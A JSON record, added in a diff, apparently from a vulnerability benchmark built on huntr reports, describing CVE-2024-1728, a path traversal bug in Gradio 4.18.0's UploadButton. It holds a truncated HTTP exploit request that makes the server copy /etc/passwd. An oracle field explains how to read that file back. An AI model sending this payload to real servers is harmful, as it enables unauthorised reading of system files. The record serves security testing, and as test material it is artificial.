@@ -1,0 +1,15 @@
+{
+  "file_id": "347_gradio_huntr_9bb33b71-7995-425d-91cc-2c2a2f2a068a",
+  "numeric_id": "347",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Local file inclusion vulnerability in Gradio's UploadButton component due to improper path validation",
+  "cve": "CVE-2024-1728",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "gradio",
+  "affected_version": "== 4.18.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "POST /queue/join? HTTP/1.1\nHost: {BASE_URL}\nContent-Length: 218\n{\"data\":[[{\"path\":\"/etc/passwd\",\"url\":\"http://{BASE_URL}/file=/help\",\"orig_name",
+  "oracle": "The attacker can read the contents of /etc/passwd by making a GET request to http://{BASE_URL}/file=/tmp/gradio/ab8648fb86eb110961613114afea833122c344de/passwd, which returns the file contents."
+}
